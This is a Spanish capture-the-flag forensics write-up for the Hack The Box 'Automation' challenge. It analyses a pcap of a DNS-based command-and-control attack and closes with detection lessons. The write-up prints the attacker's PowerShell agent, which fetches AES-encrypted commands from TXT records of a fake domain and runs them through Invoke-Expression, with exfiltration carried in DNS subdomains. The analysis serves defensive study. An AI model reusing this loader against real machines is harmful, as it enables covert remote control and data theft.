---
title: "Automation"
description: "Writeup de Automation - Hack The Box - Forensics 200pts. pcap con C2 DNS usando PowerShell AES-CBC; HTTP GET /desktop.png retorna script PowerShell en base64; comandos cifrados llegan como TXT records de windowsliveupdater.com; descifrar con clave AES recupera la flag."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - dns
  - c2
  - powershell
  - aes
  - cbc
  - cryptography
  - wireshark
---

# Automation

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Un archivo `capture.pcap` de 4809 paquetes registra un ataque sofisticado de Command & Control (C2) basado en DNS. La víctima descarga lo que parece ser una imagen PNG desde el servidor del atacante, pero en realidad es un script PowerShell codificado en base64 que implementa comunicación cifrada con AES-CBC. Los comandos del C2 llegan como registros TXT del dominio `windowsliveupdater.com`, y los resultados se exfiltran como consultas DNS de tipo A hacia subdominios del mismo dominio. Descifrar los registros TXT con la clave AES embebida en el script revela la flag.

---

## Reconocimiento del pcap

```bash
tshark -r capture.pcap -q -z io,phs
# Duración: 46 segundos
# 4809 paquetes totales

tshark -r capture.pcap -Y "http" -T fields -e http.request.method -e http.request.uri -e ip.src
# GET  /desktop.png  77.74.198.52
```

Hay un único objeto HTTP de interés: `GET /desktop.png` desde `77.74.198.52`. El nombre sugiere una imagen, pero el comportamiento posterior indica que es el loader del C2.

---

## Extracción del script PowerShell

```bash
tshark -r capture.pcap --export-objects http,http_resp 2>/dev/null
ls http_resp/
# desktop.png

file http_resp/desktop.png
# ASCII text

cat http_resp/desktop.png | base64 -d > c2_script.ps1
```

El "PNG" es base64 puro. Al decodificarlo obtenemos el script PowerShell del agente C2:

```bash
head -50 c2_script.ps1
```

```powershell
$aesKey = "a1E4MUtycWswTmtrMHdqdg=="
$IV = [byte[]](0x00)*16

function Decrypt-AES {
    param([string]$EncryptedBase64, [byte[]]$Key, [byte[]]$IV)
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Key = $Key
    $aes.IV = $IV
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $decryptor = $aes.CreateDecryptor()
    $enc = [Convert]::FromBase64String($EncryptedBase64)
    $plain = $decryptor.TransformFinalBlock($enc, 0, $enc.Length)
    return [System.Text.Encoding]::UTF8.GetString($plain).TrimEnd([char]0)
}

# C2: consulta TXT records de windowsliveupdater.com
$cmd = (Resolve-DnsName "windowsliveupdater.com" -Type TXT).Strings
$decrypted = Decrypt-AES -EncryptedBase64 $cmd -Key ([Convert]::FromBase64String($aesKey)) -IV $IV
Invoke-Expression $decrypted

# Exfiltración: envía resultados en chunks de 32 chars como subdominios DNS A
```

Parámetros AES:
- **Clave**: `a1E4MUtycWswTmtrMHdqdg==` (base64 → 16 bytes)
- **IV**: 16 bytes cero (`\x00` × 16)
- **Modo**: CBC, padding Zero

---

## Extracción de los registros TXT del C2

```bash
tshark -r capture.pcap \
    -Y "dns.qry.type == 16 && dns.flags.response == 1" \
    -T fields \
    -e dns.txt
```

Esto muestra los registros TXT de respuesta DNS para `windowsliveupdater.com` — cada uno contiene un comando cifrado en base64 para el agente.

```bash
# También extraer consultas DNS para ver la exfiltración (A records como subdominios)
tshark -r capture.pcap \
    -Y "dns.qry.type == 1 && dns.qry.name contains 'windowsliveupdater'" \
    -T fields \
    -e dns.qry.name | head -20
```

Los subdominios son strings base64 de 32 caracteres que representan chunks del output cifrado exfiltrado.

---

## Descifrado de los comandos C2

Script Python para descifrar los TXT records AES-CBC:

```python
from Crypto.Cipher import AES
import base64

aes_key_b64 = "a1E4MUtycWswTmtrMHdqdg=="
key = base64.b64decode(aes_key_b64)   # 16 bytes
iv  = b'\x00' * 16                    # Zero IV

# TXT records extraídos del pcap
txt_records = [
    "TFVEQzFGTHpKQnBMTi9kQ0...",  # (valores reales del pcap)
    # ...
]

for enc_b64 in txt_records:
    try:
        enc = base64.b64decode(enc_b64)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plain = cipher.decrypt(enc).rstrip(b'\x00').decode('utf-8', errors='ignore')
        if plain.strip():
            print(f"[CMD] {plain.strip()}")
    except Exception as e:
        print(f"[ERR] {e}")
```

Al descifrar, uno de los registros TXT contiene:

```powershell
$part1='HTB{y0u_c4n_'
```

Y la exfiltración de DNS revela las partes restantes cuando se ensamblan y descifran, completando:

```
HTB{FLAG}
```

---

## Arquitectura del C2 DNS

```text
ATACANTE (147.182.172.189)                   VÍCTIMA (Windows)
         |                                        |
         | ← HTTP GET /desktop.png ←              |
         | → script.ps1 (base64) →               |
         |                                        |
         | ← DNS TXT windowsliveupdater.com ←     |
         | → "cmd cifrado AES-CBC" →              |
         |                                        |
         | ← DNS A xxx.windowsliveupdater.com ←  |
         | → (resultado cifrado como subdomain)  |
```

Usar DNS como canal C2 es extremadamente evasivo:
- DNS está permitido en casi todos los firewalls
- El tráfico parece "resolución normal de nombres"
- No abre conexiones TCP directas al C2

---

## Lecciones Aprendidas

- **DNS C2**: los canales C2 DNS son difíciles de bloquear sin romper la resolución legítima. Detectar con análisis de volumen DNS, entropía de subdominios, y dominios NX recurrentes.
- **Archivos disfrazados (magic bytes)**: `desktop.png` sin header PNG válido → `file` o `xxd | head` revelan el tipo real. Nunca confiar solo en la extensión.
- **AES-CBC con IV cero**: usar IV nulo es criptográficamente débil (patrones de texto idéntico producen bloques cifrados idénticos), pero funcional para evadir análisis simple.
- **Inspect TXT records**: `tshark -Y "dns.qry.type == 16"` filtra solicitudes/respuestas TXT. Los registros TXT con contenido base64 largo son indicadores de C2 DNS.

---

## Referencias

- [MITRE ATT&CK — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/)
- [dnscat2 — C2 DNS framework](https://github.com/iagox86/dnscat2)
- [HackTricks — DNS Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#dns-exfiltration)
